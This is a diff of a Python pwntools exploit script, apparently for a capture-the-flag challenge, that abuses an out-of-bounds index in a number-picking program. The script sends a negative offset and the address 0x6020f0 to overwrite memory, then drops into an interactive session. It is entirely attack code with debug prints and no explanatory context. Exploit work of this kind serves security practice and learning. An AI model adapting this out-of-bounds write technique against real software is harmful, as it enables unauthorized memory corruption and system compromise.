@@ -26,30 +26,34 @@ offset = -176 / 4
 for cnt_try in range(0, 2):
     cnt_num = 0
     print('round ', cnt_try)
-    for i in numbers:
-        r_out = 'Chose the number ' + str(cnt_num) + ': '
-        r.sendlineafter(r_out, i)
-        print('sending number ', i)
-        cnt_num += 1
-
-    # raw_input()
-    r.recvuntil(':no]: ')
-    r.sendline('1')
-    # r.sendline('0')
-
-    r.recvuntil('[1 ~ 6]: ')
-    r.sendline(str(offset + 1))
-    print('finished sending offset')
-
-    r_out = 'Chose the number ' + str(offset) + ': '
     if cnt_try == 1:
-        r.sendlineafter(r_out, 0x6020f0)
-        print('finished sending part 0')
+        for i in numbers:
+            r_out = 'Chose the number ' + str(cnt_num) + ': '
+            r.sendlineafter(r_out, str(i))
+            print('sending number ', i)
+            cnt_num += 1
     elif cnt_try == 0:
-        raw_input()
-        r.sendlineafter(r_out, p64(0x6020f0))
-        # r.sendlineafter(r_out, p64(0x0))
-        print('finished sending part 1')
+        for i in range(0, 6):
+            r_out = 'Chose the number ' + str(cnt_num) + ': '
+            r.sendlineafter(r_out, str(i))
+            print('sending number ', i)
+            cnt_num += 1
+
+    raw_input()
+    r.sendlineafter('0:no]:', '1')
+
+    if cnt_try == 1:
+        r.sendlineafter('6]:', str(offset + 2))
+        print('finished sending offset', str(offset + 2))
+
+        r_out = 'Chose the number ' + str(offset + 1) + ': '
+        r.sendlineafter(r_out, 'AAA')
+    elif cnt_try == 0:
+        r.sendlineafter('6]:', str(offset + 1))
+        print('fffffinished sending offset ', str(offset + 1))
+
+        r_out = 'Chose the number ' + str(offset) + ': '
+        r.sendlineafter(r_out, '6299888')
 
 r.interactive()
 r.close()
